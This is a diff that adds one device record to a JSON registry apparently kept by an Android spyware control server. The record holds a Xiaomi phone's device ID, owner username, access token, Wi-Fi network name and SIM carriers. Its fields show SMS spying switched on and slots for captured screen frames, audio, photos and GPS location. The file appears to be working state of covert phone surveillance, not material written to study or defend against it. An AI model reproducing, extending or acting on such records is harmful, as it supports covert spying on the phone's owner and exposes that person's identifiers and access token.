@@ -44,5 +44,28 @@
     "smsSpyActive": true,
     "lastGps": null,
     "lastAudio": null
+  },
+  {
+    "deviceId": "f7f741128b03a5d1",
+    "deviceName": "Xiaomi 23028RN4DG",
+    "ownerUsername": "renzz07",
+    "token": "99281fe03ad237421340a034043582e9",
+    "lastSeen": 1779015951080,
+    "commandQueue": [],
+    "online": true,
+    "connectedAt": "2026-05-17T11:05:51.080Z",
+    "deviceInfo": {
+      "model": "Xiaomi 23028RN4DG",
+      "androidVersion": "Android 13",
+      "battery": 92,
+      "network": "WiFi: NIRWANA",
+      "sim1": "TELKOMSEL",
+      "sim2": "Tidak ada layanan"
+    },
+    "lastPhoto": null,
+    "lastScreenFrame": null,
+    "smsSpyActive": true,
+    "lastGps": null,
+    "lastAudio": null
   }
 ]
